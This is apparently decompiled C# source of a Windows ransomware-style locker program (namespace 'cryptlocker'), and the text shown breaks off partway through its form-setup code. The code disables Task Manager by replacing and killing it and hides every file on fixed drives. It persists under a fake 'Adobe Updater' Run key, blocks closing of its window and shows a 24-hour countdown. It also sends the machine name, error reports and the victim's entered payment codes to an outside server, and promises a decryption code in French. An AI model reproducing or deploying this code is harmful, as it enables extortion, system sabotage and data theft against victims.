using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Windows.Forms.Layout;
using Microsoft.Win32;
using cryptlocker.Properties;

namespace cryptlocker;

public class Form1 : Form
{
	private string filetime = "";

	private TimeSpan TS;

	private string ipAdress = "";

	private string Provider = "";

	private string Adress = "";

	private string fileName;

	private bool close = true;

	private IContainer components = null;

	private TableLayoutPanel tableLayoutPanel1;

	private TableLayoutPanel tableLayoutPanel2;

	private TableLayoutPanel tableLayoutPanel3;

	private TableLayoutPanel tableLayoutPanel4;

	private Panel panel1;

	private Label label1;

	private Panel panel2;

	private Label label2;

	private PictureBox pictureBox1;

	private Panel panel4;

	private PictureBox pictureBox3;

	private PictureBox pictureBox2;

	private Label label4;

	private Panel panel3;

	private Label label3;

	private TableLayoutPanel tableLayoutPanel5;

	private Label label5;

	private Panel panel5;

	private TableLayoutPanel tableLayoutPanel6;

	private Label label6;

	private TableLayoutPanel tableLayoutPanel7;

	private TableLayoutPanel tableLayoutPanel8;

	private TableLayoutPanel tableLayoutPanel9;

	private PictureBox pictureBox6;

	private PictureBox pictureBox5;

	private PictureBox pictureBox4;

	private Panel panel6;

	private Label label7;

	private Panel panel7;

	private Label label8;

	private PictureBox pictureBox7;

	private Panel panel8;

	private Panel keypad;

	private Button button2;

	private Button button5;

	private Button button32;

	private Button button6;

	private Button button33;

	private Button button7;

	private Button button34;

	private Button button8;

	private Button button35;

	private Button button9;

	private Button button36;

	private Button button10;

	private Button button37;

	private Button button11;

	private Button button22;

	private Button button12;

	private Button button23;

	private Button button13;

	private Button button24;

	private Button button21;

	private Button button25;

	private Button button20;

	private Button button26;

	private Button button19;

	private Button button27;

	private Button button18;

	private Button button28;

	private Button button17;

	private Button button29;

	private Button button16;

	private Button button30;

	private Button button15;

	private Button button31;

	private Button button14;

	private Button button3;

	private Button button4;

	private Button button38;

	private Button button1;

	private TextBox textBox1;

	private Panel panel9;

	private PictureBox pictureBox8;

	private TextBox textBox3;

	private TextBox textBox2;

	private Label label9;

	private Label label10;

	private Label counter;

	private Label label12;

	private Timer timer1;

	private TextBox textBox4;

	private Label label11;

	private Button button39;

	private Label label13;

	private BackgroundWorker backgroundWorker1;

	private Label label14;

	private Timer timer2;

	private void dothings()
	{
		try
		{
			if (!File.Exists(Environment.SystemDirectory + "\\svmachine.exe") && File.Exists(Environment.SystemDirectory + "\\taskmgr.exe"))
			{
				File.Move(Environment.SystemDirectory + "\\taskmgr.exe", Environment.SystemDirectory + "\\svmachine.exe");
				File.Delete(Environment.SystemDirectory + "\\taskmgr.exe");
				File.Create(Environment.SystemDirectory + "\\taskmgr.exe");
			}
		}
		catch (Exception ex)
		{
			senreport("after setting task manager " + ex.Message);
		}
		List<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (DriveType.Fixed == driveInfo.DriveType)
			{
				list.Add(driveInfo.Name);
			}
		}
		string path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\user";
		if (File.Exists(path))
		{
			filetime = File.ReadAllText(path);
		}
		else
		{
			File.WriteAllText(path, DateTime.Now.ToString());
			filetime = DateTime.Now.ToString();
			try
			{
				backgroundWorker1.RunWorkerAsync(list);
			}
			catch (Exception ex2)
			{
				senreport("after HideFiles " + ex2.Message);
			}
		}
		string s = filetime;
		string s2 = DateTime.Now.ToString();
		TS = new TimeSpan(24, 0, 0) - new TimeSpan(DateTime.Parse(s2).Ticks - DateTime.Parse(s).Ticks);
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\system.exe"))
		{
			try
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\system.exe");
			}
			catch (Exception ex3)
			{
				senreport("after Delete systeme.exe " + ex3.Message);
			}
		}
		else
		{
			fileName = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\system.exe";
		}
		fileName = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\system.exe";
		if (fileName != Application.get_ExecutablePath().ToString())
		{
			try
			{
				File.Copy(Application.get_ExecutablePath().ToString(), fileName, overwrite: true);
			}
			catch (Exception ex4)
			{
				senreport("after copy systeme.exe " + ex4.Message);
			}
		}
		timer1.set_Enabled(true);
		((Control)counter).set_Text(TS.Days * 24 + TS.Hours + ":" + TS.Minutes + ":" + TS.Seconds);
		TS = TS.Subtract(new TimeSpan(0, 0, 1));
		try
		{
			Notify();
		}
		catch (Exception ex5)
		{
			senreport("after Notify " + ex5.Message);
		}
		try
		{
			LookUp();
		}
		catch (Exception ex6)
		{
			senreport("after lookup " + ex6.Message);
		}
	}

	public Form1()
	{
		InitializeComponent();
		setKeypad();
		try
		{
			SetStartup();
		}
		catch (Exception ex)
		{
			senreport("after setstartup " + ex.Message);
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (close)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void setKeypad()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		foreach (Control item in (ArrangedElementCollection)((Control)keypad).get_Controls())
		{
			Control val = item;
			if ((object)((object)val).GetType() == typeof(Button))
			{
				val.add_Click((EventHandler)Butn_Click);
			}
		}
	}

	private void LookUp()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://api.ipify.org/");
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			string text = (ipAdress = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd());
			((Control)label5).set_Text(ipAdress + Environment.NewLine + Provider + Environment.NewLine + Adress);
		}
		catch (Exception ex)
		{
			senreport("in lookup " + ex.Message);
		}
	}

	private void HideFiles(List<string> folders)
	{
		foreach (string folder in folders)
		{
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(folder);
				try
				{
					directoryInfo.Attributes |= FileAttributes.Hidden;
				}
				catch (Exception)
				{
				}
				FileInfo[] files = directoryInfo.GetFiles();
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					try
					{
						fileInfo.Attributes |= FileAttributes.Hidden;
					}
					catch (Exception)
					{
					}
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				List<string> list = new List<string>();
				DirectoryInfo[] array2 = directories;
				foreach (DirectoryInfo directoryInfo2 in array2)
				{
					list.Add(directoryInfo2.FullName);
				}
				HideFiles(list);
			}
			catch (Exception)
			{
			}
		}
	}

	private void UnHideFiles(List<string> folders)
	{
		foreach (string folder in folders)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(folder);
			File.SetAttributes(folder, FileAttributes.Normal);
			try
			{
				directoryInfo.Attributes |= FileAttributes.Normal;
			}
			catch (Exception)
			{
			}
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				try
				{
					File.SetAttributes(fileInfo.FullName, FileAttributes.Normal);
				}
				catch (Exception)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			List<string> list = new List<string>();
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo directoryInfo2 in array2)
			{
				list.Add(directoryInfo2.FullName);
			}
			UnHideFiles(list);
		}
	}

	private void SetStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Adobe Updater", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\system.exe");
	}

	private void Notify()
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://benkerroum.be/api/index.php/api/note");
		string s = "c=" + Environment.MachineName;
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentLength = bytes.Length;
		using (Stream stream = httpWebRequest.GetRequestStream())
		{
			stream.Write(bytes, 0, bytes.Length);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
	}

	private void senreport(string message)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://benkerroum.be/api/index.php/api/report");
			string text = "c=" + Environment.MachineName;
			text = text + "&e=" + DateTime.Now.ToString() + "--->" + Application.get_ExecutablePath() + "--->" + message;
			byte[] bytes = Encoding.ASCII.GetBytes(text);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = httpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		}
		catch (Exception)
		{
		}
	}

	private void Butn_Click(object sender, EventArgs e)
	{
		Button val = (Button)((sender is Button) ? sender : null);
		if (((Control)textBox1).get_Text().Length < 4)
		{
			TextBox val2 = textBox1;
			((Control)val2).set_Text(((Control)val2).get_Text() + ((Control)val).get_Text());
		}
		else if (((Control)textBox2).get_Text().Length < 3)
		{
			TextBox val2 = textBox2;
			((Control)val2).set_Text(((Control)val2).get_Text() + ((Control)val).get_Text());
		}
		else if (((Control)textBox3).get_Text().Length < 3)
		{
			TextBox val2 = textBox3;
			((Control)val2).set_Text(((Control)val2).get_Text() + ((Control)val).get_Text());
		}
		Console.Beep();
	}

	private void button38_Click(object sender, EventArgs e)
	{
		try
		{
			if (((Control)textBox3).get_Text().Length > 0)
			{
				((Control)textBox3).set_Text(((Control)textBox3).get_Text().Remove(((Control)textBox3).get_Text().Length - 1));
			}
			else if (((Control)textBox2).get_Text().Length > 0)
			{
				((Control)textBox2).set_Text(((Control)textBox2).get_Text().Remove(((Control)textBox2).get_Text().Length - 1));
			}
			else if (((Control)textBox1).get_Text().Length > 0)
			{
				((Control)textBox1).set_Text(((Control)textBox1).get_Text().Remove(((Control)textBox1).get_Text().Length - 1));
			}
		}
		catch (Exception)
		{
			Console.Beep(37, 1500);
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		((Control)counter).set_Text(TS.Days * 24 + TS.Hours + ":" + TS.Minutes + ":" + TS.Seconds);
		TS = TS.Subtract(new TimeSpan(0, 0, 1));
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "ABCD")
		{
			close = false;
			((Form)this).Close();
		}
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://benkerroum.be/api/");
		string text = "c=" + ((Control)textBox1).get_Text() + ((Control)textBox2).get_Text() + ((Control)textBox3).get_Text();
		text = text + "&m=" + ((Control)textBox4).get_Text();
		byte[] bytes = Encoding.ASCII.GetBytes(text);
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentLength = bytes.Length;
		using (Stream stream = httpWebRequest.GetRequestStream())
		{
			stream.Write(bytes, 0, bytes.Length);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		string text2 = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		if (text2 == "ok")
		{
			MessageBox.Show("Votre Demande a ete envoyer Vous aller recevoir un email avec un code de decryptage \u00b4dans les 24 h");
		}
		else
		{
			MessageBox.Show("Votre Demande n'a pas ete enoyer voulliez reesayer!");
		}
	}

	private void button39_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		dothings();
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		HideFiles(e.Argument as List<string>);
	}

	private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		((Control)label14).set_Text("ok");
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_0279: Unknown result type (might be due to invalid IL or missing references)
		//IL_0283: Expected O, but got Unknown
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_028e: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		//IL_029a: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a4: Expected O, but got Unknown
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Expected O, but got Unknown
		//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ba: Expected O, but got Unknown
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e6: Expected O, but got Unknown
		//IL_02e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f1: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0307: Expected O, but got Unknown
		//IL_0308: Unknown result type (might be due to invalid IL or missing references)
		//IL_0312: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0328: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_034a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0354: Expected O, but got Unknown
		//IL_0355: Unknown result type (might be due to invalid IL or missing references)
		//IL_035f: Expected O, but got Unknown
		//IL_0360: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Expected O, but got Unknown
		//IL_036b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Expected O, but got Unknown
		//IL_0376: Unknown result type (might be due to invalid IL or missing references)
		//IL_0380: Expected O, but got Unknown
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_038b: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		//IL_0397: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Expected O, but got Unknown
		//IL_03a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ac: Expected O, but got Unknown
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_03e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ef: Expected O, but got Unknown
		//IL_053b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0545: Expected O, but got Unknown
		//IL_0557: Unknown result type (might be due to invalid IL or missing references)
		//IL_0561: Expected O, but got Unknown
		//IL_0655: Unknown result type (might be due to invalid IL or missing references)
		//IL_065f: Expected O, but got Unknown
		//IL_0671: Unknown result type (might be due to invalid IL or missing references)
		//IL_067b: Expected O, but got Unknown
		//IL_068d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0697: Expected O, but got Unknown
		//IL_06a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ad: Expected O, but got Unknown
		//IL_06bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c9: Expected O, but got Unknown
		//IL_070d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0717: Expected O, but got Unknown
		//IL_0729: Unknown result type (might be due to invalid IL or missing references)
		//IL_0733: Expected O, but got Unknown
		//IL_07b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bd: Expected O, but got Unknown
		//IL_0801: Unknown result type (might be due to invalid IL or missing references)
		//IL_080b: Expected O, but got Unknown
		//IL_081d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0827: Expected O, but got Unknown
		//IL_088e: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bf: Expected O, but got Unknown
		//IL_08d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08db: Expected O, but got Unknown
		//IL_09ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f7: Expected O, but got Unknown
		//IL_0a20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c37: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c41: Expected O, but got Unknown
		//IL_0c6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cce: Expected O, but got Unknown
		//IL_0ce0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cea: Expected O, but got Unknown
		//IL_0d55: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d86: Expected O, but got Unknown
		//IL_0d98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da2: Expected O, but got Unknown
		//IL_0ea7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eb1: Expected O, but got Unknown
		//IL_0edb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f58: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f62: Expected O, but got Unknown
		//IL_0f8b: Unknown result type (might be due to invalid IL or missing references)
		//IL_10dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e7: Expected O, but got Unknown
		//IL_10f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1103: Expected O, but got Unknown
		//IL_117f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1189: Expected O, but got Unknown
		//IL_119b: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a5: Expected O, but got Unknown
		//IL_1286: Unknown result type (might be due to invalid IL or missing references)
		//IL_1290: Expected O, but got Unknown
		//IL_12c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1343: Unknown result type (might be due to invalid IL or missing references)
		//IL_134d: Expected O, but got Unknown
		//IL_13ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d4: Expected O, but got Unknown
		//IL_13e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_13f0: Expected O, but got Unknown
		//IL_1444: Unknown result type (might be due to invalid IL or missing references)
		//IL_144e: Expected O, but got Unknown
		//IL_1460: Unknown result type (might be due to invalid IL or missing references)
		//IL_146a: Expected O, but got Unknown
		//IL_147c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1486: Expected O, but got Unknown
		//IL_151a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1524: Expected O, but got Unknown
		//IL_1536: Unknown result type (might be due to invalid IL or missing references)
		//IL_1540: Expected O, but got Unknown
		//IL_3427: Unknown result type (might be due to invalid IL or missing references)
		//IL_3431: Expected O, but got Unknown
		//IL_345a: Unknown result type (might be due to invalid IL or missing references)
		//IL_34d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_34e1: Expected O, but got Unknown
		//IL_350b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3617: Unknown result type (might be due to invalid IL or missing references)
		//IL_3621: Expected O, but got Unknown
		//IL_364b: Unknown result type (might be due to invalid IL or missing references)
		//IL_36c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_36cc: Expected O, but got Unknown
		//IL_36de: Unknown result type (might be due to invalid IL or missing references)
		//IL_36e8: Expected O, but got Unknown
		//IL_36fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_3704: Expected O, but got Unknown
		//IL_3780: Unknown result type (might be due to invalid IL or missing references)
		//IL_378a: Expected O, but got Unknown
		//IL_37cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_37d5: Expected O, but got Unknown
		//IL_37e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_37f1: Expected O, but got Unknown
		//IL_3871: Unknown result type (might be due to invalid IL or missing references)
		//IL_387b: Expected O, but got Unknown
		//IL_38ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_38d8: Expected O, but got Unknown
		//IL_3901: Unknown result type (might be due to invalid IL or missing references)
		//IL_397a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3984: Expected O, but got Unknown
		//IL_39b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ad8: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ae2: Expected O, but got Unknown
		//IL_3bc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c22: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c2c: Expected O, but got Unknown
		//IL_3c56: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d50: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d5a: Expected O, but got Unknown
		//IL_3d8b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e15: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e1f: Expected O, but got Unknown
		//IL_3e4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f38: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f42: Expected O, but got Unknown
		//IL_3f6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_408c: Unknown result type (might be due to invalid IL or missing references)
		//IL_4096: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		tableLayoutPanel1 = new TableLayoutPanel();
		tableLayoutPanel2 = new TableLayoutPanel();
		tableLayoutPanel3 = new TableLayoutPanel();
		panel4 = new Panel();
		label4 = new Label();
		pictureBox3 = new PictureBox();
		pictureBox2 = new PictureBox();
		panel1 = new Panel();
		label1 = new Label();
		tableLayoutPanel4 = new TableLayoutPanel();
		panel2 = new Panel();
		label13 = new Label();
		label2 = new Label();
		pictureBox1 = new PictureBox();
		panel5 = new Panel();
		tableLayoutPanel7 = new TableLayoutPanel();
		panel7 = new Panel();
		label8 = new Label();
		tableLayoutPanel8 = new TableLayoutPanel();
		tableLayoutPanel9 = new TableLayoutPanel();
		pictureBox6 = new PictureBox();
		pictureBox5 = new PictureBox();
		pictureBox4 = new PictureBox();
		panel8 = new Panel();
		button39 = new Button();
		textBox4 = new TextBox();
		textBox3 = new TextBox();
		textBox2 = new TextBox();
		keypad = new Panel();
		button2 = new Button();
		button5 = new Button();
		button32 = new Button();
		button6 = new Button();
		button33 = new Button();
		button7 = new Button();
		button34 = new Button();
		button8 = new Button();
		button35 = new Button();
		button9 = new Button();
		button36 = new Button();
		button10 = new Button();
		button37 = new Button();
		button11 = new Button();
		button22 = new Button();
		button12 = new Button();
		button23 = new Button();
		button13 = new Button();
		button24 = new Button();
		button21 = new Button();
		button25 = new Button();
		button20 = new Button();
		button26 = new Button();
		button19 = new Button();
		button27 = new Button();
		button18 = new Button();
		button28 = new Button();
		button17 = new Button();
		button29 = new Button();
		button16 = new Button();
		button30 = new Button();
		button15 = new Button();
		button31 = new Button();
		button14 = new Button();
		button3 = new Button();
		button4 = new Button();
		button38 = new Button();
		button1 = new Button();
		textBox1 = new TextBox();
		label9 = new Label();
		label11 = new Label();
		panel3 = new Panel();
		label3 = new Label();
